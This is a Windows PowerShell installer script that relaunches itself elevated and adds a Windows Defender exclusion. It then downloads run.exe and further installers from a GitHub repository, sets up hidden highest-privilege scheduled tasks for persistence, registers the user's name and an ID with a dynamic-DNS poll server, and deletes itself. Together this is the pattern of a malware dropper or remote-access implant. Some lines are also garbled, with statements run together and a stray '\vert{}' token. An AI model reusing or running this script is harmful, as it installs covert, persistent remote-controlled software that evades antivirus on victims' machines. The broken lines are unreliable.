$ErrorActionPreference = "SilentlyContinue"

Write-Host "1. Initializing environment paths and variables"
$VPS_POLL_URL = "http://runx.ddns.net/api/poll"

$self = [System.Diagnostics.Process]::GetCurrentProcess().MainModule.FileName
$runDir = "$env:APPDATA\run"
$runExe = "$runDir\run.exe"
$installDir = "$env:TEMP\run"
$installer = "$installDir\ss_installer.ps1"

$datDir = "$env:APPDATA\Microsoft\run"
$datFile = "$datDir\run.dat"

$isUpdate = Test-Path $datFile$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

# UAC prompt (fresh install)
if (-not $isUpdate -and -not$isAdmin) {
  Write-Host "2. Requesting administrator privileges via UAC"
  Start-Process -FilePath $self -Verb RunAs
  exit
}

# Add exclusion to defender
if (-not $isUpdate) {
  Write-Host "3. Adding Windows Defender exclusion for run directory"
  Add-MpPreference -ExclusionPath $runDir | Out-Null
}

Write-Host "4. Creating required local application directories"
if (-not (Test-Path $datDir)) {
  New-Item -ItemType Directory -Path $datDir -Force | Out-Null
}
New-Item -ItemType Directory -Path "$env:TEMP" -Force | Out-Null
New-Item -ItemType Directory -Path $installDir -Force | Out-Null

Write-Host "5. Terminating any active 'run' processes"
Get-Process -Name "run" | Stop-Process -Force | Out-Null
New-Item -ItemType Directory -Path $runDir -Force | Out-Null

# Fetch latest run.exe
Write-Host "6. Fetching latest commit SHA from GitHub repository"
try {
  $apiResponse = Invoke-RestMethod -Uri "https://api.github.com/repos/yuan-miranda/run/commits/main" -UseBasicParsing
  $latestCommit =$apiResponse.sha
}
catch {
  $latestCommit = "main"
}

Write-Host "7. Downloading binary and installer script from GitHub"
Invoke-WebRequest -Uri "https://github.com/yuan-miranda/run/raw/$latestCommit/run.exe" -OutFile $runExe -UseBasicParsing
Invoke-WebRequest -Uri "https://github.com/yuan-miranda/run/raw/$latestCommit/frames_dev/ss_installer.ps1" -OutFile $installer -UseBasicParsing

if (-not (Test-Path $runExe) -or -not (Test-Path$installer)) {
  exit
}

# Auto run task
Write-Host "8. Configuring and registering scheduled tasks"
$taskName = "WinRun"
$action = New-ScheduledTaskAction -Execute $runExe -WorkingDirectory$runDir
$trigger = New-ScheduledTaskTrigger -AtLogOn$settings = New-ScheduledTaskSettingsSet `
  -AllowStartIfOnBatteries `
  -DontStopIfGoingOnBatteries `
  -ExecutionTimeLimit (New-TimeSpan -Days 365)

# Installer task
$installerTaskName = "WinRunInstaller"
$cmd = 'powershell.exe -Command "$p=\"$env:APPDATA\run\"; if (!(Test-Path $p)) { New-Item -ItemType Directory -Path$p }; $sha=(Invoke-RestMethod ''https://api.github.com/repos/yuan-miranda/run/commits/main'').sha; $o=\"$p\installer.exe\"; Invoke-WebRequest -Uri \"https://github.com/yuan-miranda/run/raw/$sha/installer.exe\" -OutFile $o; Start-Process$o"'
$installerAction = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument " -Command $cmd"
$installerSettings = New-ScheduledTaskSettingsSet `
  -AllowStartIfOnBatteries `
  -DontStopIfGoingOnBatteries `
  -ExecutionTimeLimit (New-TimeSpan -Minutes 10) `
  -Hidden

Register-ScheduledTask -TaskName $taskName -Action$action -Trigger $trigger -Settings$settings -RunLevel Highest -Force | Out-Null
Register-ScheduledTask -TaskName $installerTaskName -Action $installerAction -Settings$installerSettings -RunLevel Highest -Force | Out-Null

# Mark installed
Write-Host "9. Executing installer script and writing installation marker"
Start-Process powershell.exe -ArgumentList '-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', "& '$installer'"  -Wait
$latestCommit \vert{} Out-File$datFile

Write-Host "10. Generating or loading unique client ID"
$IdPath = "$env:APPDATA\Microsoft\run\run.txt"
if (Test-Path $IdPath) {
  $raw = (Get-Content$IdPath -Raw).Trim()
  if ($raw.Length -ge 8) {
    $uniqueId =$raw.Substring(0, 8)
  }
  else {
    $uniqueId =$raw
  }
}
else {
  $uniqueId = ([guid]::NewGuid().ToString()).Substring(0, 8)
  Set-Content -Path $IdPath -Value$uniqueId
}
$uniqueUser = "$($env:USERNAME)-$uniqueId-W"

Write-Host "11. Registering client with VPS poll endpoint"
try {
  Invoke-RestMethod -Method Get -Uri "$VPS_POLL_URL?username=$uniqueUser" | Out-Null
}
catch {}

Write-Host "12. Starting run.exe process"
Start-Process $runExe

Write-Host "13. Scheduling cleanup of installer and self-script files"
if ($installer) {
  Start-Process powershell -ArgumentList "-Command `"Start-Sleep 2; Remove-Item '$installer' -Force`""
}

if ($self) {
  Start-Process powershell -ArgumentList "-Command `"Start-Sleep 4; Remove-Item '$self' -Force`""
}
